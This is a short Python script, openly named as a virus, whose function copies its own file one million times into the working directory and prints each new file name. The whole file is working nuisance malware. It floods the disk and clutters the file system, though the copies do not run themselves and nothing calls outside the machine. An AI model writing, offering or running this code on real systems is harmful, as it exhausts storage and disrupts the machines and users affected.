import os
import shutil

def virus():
    file = __file__

    for i in range(1000000):
        new_file = f'copy_{i}.py'
        shutil.copy(file, new_file)
        print(f'[!] Created {new_file}')

if __name__ == '__main__':
    virus()